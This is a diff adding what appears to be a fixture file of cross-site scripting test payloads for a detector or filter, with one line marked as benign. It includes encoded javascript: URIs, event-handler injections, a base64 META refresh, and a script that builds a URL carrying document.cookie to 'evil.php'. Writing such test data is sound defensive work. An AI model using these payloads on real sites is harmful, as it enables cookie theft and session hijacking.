@@ -1,0 +1,18 @@
+#XSS using script via encoded URI Schemes
+<IMG SRC=j&#X41vascript:alert('test2')>
+linie fara continut malitios
+#XSS using script in Attribute
+http://url.to.file.which/not.exist2
+<b onmouseover=alert('Wufff!')>click me!</b>
+
+<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>
+
+<SCRIPT type="text/javascript">
+var adr = '../evil.php?cakemonster=' + escape(document.cookie);
+</SCRIPT>
+
+http://testsite.test/<script>alert("TEST");</script>
+
+#XSS Using code encoding - check regex for base64
+<META HTTP-EQUIV="refresh"
+CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">
